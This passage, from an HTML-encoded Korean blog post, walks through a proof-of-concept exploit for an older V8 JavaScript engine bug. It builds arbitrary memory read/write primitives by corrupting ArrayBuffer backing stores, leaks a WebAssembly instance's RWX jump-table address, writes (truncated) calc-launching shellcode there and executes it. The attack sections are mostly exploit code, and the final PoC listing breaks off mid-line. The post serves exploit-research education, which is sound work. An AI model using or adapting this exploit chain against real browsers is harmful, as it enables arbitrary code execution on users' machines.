&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>ROP &#xCCB4;&#xC778;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC0C1;&#xB2F9;&#xD788; &#xBCF5;&#xC7A1;&#xD55C; &#xC791;&#xC5C5;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xC880; &#xB354; &#xB2E8;&#xC21C;&#xD558;&#xACE0; &#xD6A8;&#xC728;&#xC801;&#xC778; <strong>WebAssembly (wasm)</strong>&#xB97C; &#xD1B5;&#xD574; exploit&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="WebAssembly-&#xAE30;&#xBCF8;-&#xC6D0;&#xB9AC;"><a href="#WebAssembly-&#xAE30;&#xBCF8;-&#xC6D0;&#xB9AC;" class="headerlink" title="WebAssembly &#xAE30;&#xBCF8; &#xC6D0;&#xB9AC;"></a>WebAssembly &#xAE30;&#xBCF8; &#xC6D0;&#xB9AC;</h3><p>WebAssembly&#xB294; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC800;&#xC218;&#xC900; &#xC5B8;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC124;&#xACC4;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD3EC;&#xB9F7; &#xC5B8;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; C/C++&#xACFC; &#xAC19;&#xC740; &#xC5B8;&#xC5B4;&#xB97C; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD560; &#xB54C; &#xD65C;&#xC6A9;&#xB418;&#xBA70;, &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>V8 &#xC5D4;&#xC9C4;&#xC740; wasm &#xCF54;&#xB4DC;&#xB97C; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xD615;&#xD0DC;&#xB85C; JIT &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xBA3C;&#xC800; <strong>Liftoff</strong>&#xB77C;&#xB294; &#xBCA0;&#xC774;&#xC2A4;&#xB77C;&#xC778; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB85C; 1&#xCC28; &#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. wasm &#xB610;&#xD55C; JIT &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; RWX &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xAE30;&#xACC4;&#xC5B4; &#xCF54;&#xB4DC;&#xAC00; &#xAE30;&#xB85D;&#xB429;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; asm.js&#xC640;&#xC758; &#xD638;&#xD658;&#xC131; &#xBB38;&#xC81C; &#xB54C;&#xBB38;&#xC5D0; wasm&#xC5D0; &#xB300;&#xD55C; write-protect &#xD50C;&#xB798;&#xADF8;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAEBC;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; wasm&#xC740; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0;&#xC11C; &#xB9E4;&#xC6B0; &#xC720;&#xC6A9;&#xD55C; &#xB3C4;&#xAD6C;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p>V8&#xC5D0;&#xC11C; wasm &#xBAA8;&#xB4C8;&#xC774; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xD654;&#xB418;&#xBA74;, &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC740; <strong>Jump Table</strong>&#xC744; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. Jump Table&#xC740; &#xAC01; &#xD568;&#xC218; &#xC2AC;&#xB86F;&#xC774; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xC2E4;&#xC81C; &#xAE30;&#xACC4;&#xC5B4; &#xCF54;&#xB4DC; &#xD3EC;&#xC778;&#xD130;(WasmCode &#xAC1D;&#xCCB4;)&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD3EC;&#xC778;&#xD130;&#xB294; RWX &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBBC0;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB97C; &#xB36E;&#xC5B4;&#xC50C;&#xC6CC; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. (2018&#xB144; &#xB2F9;&#xC2DC; V8 &#xD799;&#xC758; &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14;&#xC740; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xBC0F; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xC5EC; &#xCF54;&#xB4DC; &#xD558;&#xC774;&#xC7AC;&#xD0B9;&#xC5D0; &#xC6A9;&#xC774;&#xD588;&#xB294;&#xB370; &#xC9C0;&#xAE08;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;..&#x315C;.&#x315C;)</p><h3 id="addrOf-&#xD568;&#xC218;-re-building"><a href="#addrOf-&#xD568;&#xC218;-re-building" class="headerlink" title="addrOf &#xD568;&#xC218; re-building"></a>addrOf &#xD568;&#xC218; re-building</h3><p>&#xC774;&#xC81C; &#xC6B0;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E0; read/write primitive&#xB97C; &#xD65C;&#xC6A9;&#xD574; wasm &#xC778;&#xC2A4;&#xD134;&#xC2A4; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xC640; RWX &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14; &#xD3EC;&#xC778;&#xD130;&#xB97C; leak&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xAE30;&#xC874; addrOf primitive&#xB294; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; overlapping&#xD574;&#xC11C; &#xB36E;&#xC5B4;&#xC368;&#xC57C; &#xD574;&#xC11C; &#xB2E4;&#xB978; &#xAE30;&#xB2A5;&#xC744; &#xB9DD;&#xAC00;&#xB728;&#xB9B4; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C;, &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xBC95;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; ArrayBuffer&#xC5D0; <strong>out-of-line property</strong> &#xB97C; &#xCD94;&#xAC00;&#xD558;&#xACE0; &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xC2DC;&#xD0A8; &#xB4A4;, &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xBC30;&#xC5F4;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC77D;&#xC5B4; &#xAC1D;&#xCCB4; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xAE30;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; <code>addrOf</code> &#xAD6C;&#xD604;&#xC744; &#xC644;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC774;&#xC720;_<br>ArrayBuffer&#xB294; &#xC790;&#xCCB4;&#xC801;&#xC73C;&#xB85C; raw &#xBC14;&#xC774;&#xD2B8; &#xBC84;&#xD37C;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xBA70;, &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xC640; &#xBCC4;&#xB3C4;&#xB85C; <strong>&#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xC800;&#xC7A5;&#xC18C;(property store)</strong> &#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; out-of-line &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xBA74;, &#xADF8; &#xC800;&#xC7A5;&#xC18C; &#xB0B4;&#xBD80;&#xC5D0; &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xBCF4;&#xAD00;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8; &#xD655;&#xBCF4;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xD1B5;&#xD574; &#xC774; &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xC800;&#xC7A5;&#xC18C;&#xC758; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xAC04;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xC9C1;&#xC811; &#xAC1D;&#xCCB4; &#xD544;&#xB4DC;&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xC9C0; &#xC54A;&#xACE0;&#xB3C4; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> memory = {  addrOf(obj) {    <span class="hljs-comment">// Set object address to new out-of-line property called leakme</span>    arrBuf2.leakMe = obj;    <span class="hljs-comment">// Use read64 primitive to leak the properties backing store address of our array buffer</span>    <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;    <span class="hljs-comment">// Read offset 16 from the array buffer backing store and return the address of our object</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;  }};</code></pre><p>&#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>wasmInstance</code> &#xC640; &#xADF8; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; RWX jump table &#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h2 id="1-3-RCE-PoC"><a href="#1-3-RCE-PoC" class="headerlink" title="1.3. RCE PoC"></a>1.3. RCE PoC</h2><p>&#xC774;&#xC81C; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD569;&#xCCD0;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-primitive-&#xAD6C;&#xCD95;"><a href="#1-primitive-&#xAD6C;&#xCD95;" class="headerlink" title="[1] primitive &#xAD6C;&#xCD95;"></a>[1] primitive &#xAD6C;&#xCD95;</h3><p>2&#xBC88;&#xC9F8; ArrayBuffer&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xACE0;(<code>addOf</code>) 1&#xBC88;&#xC9F8; &#xBC84;&#xD37C;&#xC758; backing store pointer&#xB97C; 2&#xBC88;&#xC9F8; ArrayBuffer&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB97C; &#xD1A0;&#xB300;&#xB85C; Memory Read/Write primitive&#xB97C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Create Array Buffers</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-keyword">let</span> arrBuf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-comment">// Leak Address of arrBuf2</span>print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf2Addr = addrOf(arrBuf2);print(<span class="hljs-string">`[+] ArrayBuffer Address @ 0x<span class="hljs-subst">${arrBuf2Addr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-comment">// Corrupt Backing Store Pointer of arrBuf1 with Address to arrBuf2</span>print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store...&quot;</span>)<span class="hljs-keyword">let</span> originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);<span class="hljs-comment">// Store Original Backing Store Pointer of arrBuf2</span><span class="hljs-keyword">let</span> view1 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf1)<span class="hljs-keyword">let</span> originalArrBuf2BackingStore = view1[<span class="hljs-number">4</span>]<span class="hljs-comment">// Construct Memory Primitives via Array Buffers</span><span class="hljs-keyword">let</span> memory = {  write(addr, bytes) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(arrBuf2);    view2.set(bytes);  },  read64(addr) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);    <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];  },  write64(addr, ptr) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);    view2[<span class="hljs-number">0</span>] = ptr;  },  addrOf(obj) {    arrBuf2.leakMe = obj;    <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;  }};print(<span class="hljs-string">&quot;[+] Constructed Memory Read and Write Primitive!&quot;</span>);</code></pre><h3 id="2-WebAssembly-&#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C;-&#xC0DD;&#xC131;"><a href="#2-WebAssembly-&#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C;-&#xC0DD;&#xC131;" class="headerlink" title="[2] WebAssembly &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;"></a>[2] WebAssembly &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;</h3><p>&#xC774; wasm &#xCF54;&#xB4DC; &#xBE14;&#xB85D;&#xC740; &#xAC04;&#xB2E8;&#xD55C; &#x201C;&#xB354;&#xBBF8; &#xD568;&#xC218;&#x201D;&#xB97C; JIT &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xBA74; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <strong>RWX &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14;</strong>&#xC774; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4;&#xC5D0; &#xC774; RWX &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;&#xC5D0; &#xC178;&#xCF54;&#xB4DC;&#xB97C; &#xB36E;&#xC5B4;&#xC368; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">print(<span class="hljs-string">&quot;[+] Generating a WebAssembly Instance...&quot;</span>);<span class="hljs-comment">// Generate RWX region for Shellcode via WASM</span><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule);<span class="hljs-keyword">var</span> func = wasmInstance.exports.main;</code></pre><h3 id="3-RWX-&#xC810;&#xD504;-&#xD14C;&#xC774;&#xBE14;-&#xD3EC;&#xC778;&#xD130;-&#xC8FC;&#xC18C;-&#xD68D;&#xB4DD;"><a href="#3-RWX-&#xC810;&#xD504;-&#xD14C;&#xC774;&#xBE14;-&#xD3EC;&#xC778;&#xD130;-&#xC8FC;&#xC18C;-&#xD68D;&#xB4DD;" class="headerlink" title="[3] RWX &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14; &#xD3EC;&#xC778;&#xD130; &#xC8FC;&#xC18C; &#xD68D;&#xB4DD;"></a>[3] RWX &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14; &#xD3EC;&#xC778;&#xD130; &#xC8FC;&#xC18C; &#xD68D;&#xB4DD;</h3><p>&#xC55E;&#xC5D0;&#xC11C; &#xB9CC;&#xB4E0; primitive&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; wasm &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xD68D;&#xB4DD;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs jsx"><span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table Start Pointer</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);</code></pre><h3 id="4-&#xC258;&#xCF54;&#xB4DC;-&#xC0BD;&#xC785;"><a href="#4-&#xC258;&#xCF54;&#xB4DC;-&#xC0BD;&#xC785;" class="headerlink" title="[4] &#xC258;&#xCF54;&#xB4DC; &#xC0BD;&#xC785;"></a>[4] &#xC258;&#xCF54;&#xB4DC; &#xC0BD;&#xC785;</h3><p>&#xBA3C;&#xC800; <code>wasmInstance</code> &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xC5D0; <code>0xf0</code> &#xC624;&#xD504;&#xC14B;&#xC744; &#xB354;&#xD574; <strong>&#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14; &#xD3EC;&#xC778;&#xD130;</strong>&#xB97C; &#xC77D;&#xC5B4;&#xC635;&#xB2C8;&#xB2E4;. <code>read64</code>&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; RWX &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC740; &#xB4A4;, &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xADF8; &#xC704;&#xCE58;&#xC5D0; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table Start Pointer</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);print(<span class="hljs-string">&quot;[+] Preparing Shellcode...&quot;</span>);<span class="hljs-comment">// Prepare Calc Shellcode</span><span class="hljs-keyword">let</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0x48</span>,...print(<span class="hljs-string">&quot;[+] Writing Shellcode to Jump Table Address...&quot;</span>);<span class="hljs-comment">// Write Shellcode to Jump Table Start Address</span>memory.write(wasmRWXAddr, shellcode);</code></pre><h3 id="5-wasm-&#xD568;&#xC218;&#xB97C;-&#xD638;&#xCD9C;&#xD558;&#xC5EC;-&#xC178;&#xCF54;&#xB4DC;&#xB97C;-&#xC2E4;&#xD589;"><a href="#5-wasm-&#xD568;&#xC218;&#xB97C;-&#xD638;&#xCD9C;&#xD558;&#xC5EC;-&#xC178;&#xCF54;&#xB4DC;&#xB97C;-&#xC2E4;&#xD589;" class="headerlink" title="[5] wasm &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC178;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;"></a>[5] wasm &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC178;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;</h3><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xB2E8;&#xACC4;&#xB294; &#xB2E8;&#xC21C;&#xD788; <code>wasm</code> &#xD568;&#xC218;(<code>main</code>)&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC810;&#xD504; &#xD14C;&#xC774;&#xBE14;&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xC5D0;&#xB294; &#xC774;&#xBBF8; &#xC258;&#xCF54;&#xB4DC;&#xB85C; &#xBC14;&#xB00C;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C;, &#xD638;&#xCD9C;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; &#xC178;&#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Execute our Shellcode</span>print(<span class="hljs-string">&quot;[+] Popping Calc...&quot;</span>);func();</code></pre><p>&#xC774;&#xB85C;&#xC368; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC2E4;&#xC81C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; &#xC704; &#xB0B4;&#xC6A9;&#xC744; &#xBC18;&#xC601;&#xD55C; &#xCD5C;&#xC885;&#xC801;&#xC778; poc &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><blockquote><p>Part 1. &#xC5D0;&#xC11C; &#xC774;&#xC57C;&#xAE30;&#xD588;&#xB2E4;&#xC2DC;&#xD53C; &#xC704; &#xC2E4;&#xC2B5;&#xC740; Linux &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; Linux PoC Code&#xC785;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs jsx"><span class="hljs-comment">// Conversion Buffers</span><span class="hljs-keyword">let</span> floatView = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(<span class="hljs-number">1</span>);<span class="hljs-keyword">let</span> uint64View = <span class="hljs-keyword">new</span> BigUint64Array(floatView.buffer);<span class="hljs-built_in">Number</span>.prototype.toBigInt = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toBigInt</span>(<span class="hljs-params"></span>) </span>{    floatView[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> uint64View[<span class="hljs-number">0</span>];};BigInt.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{    uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];};<span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line 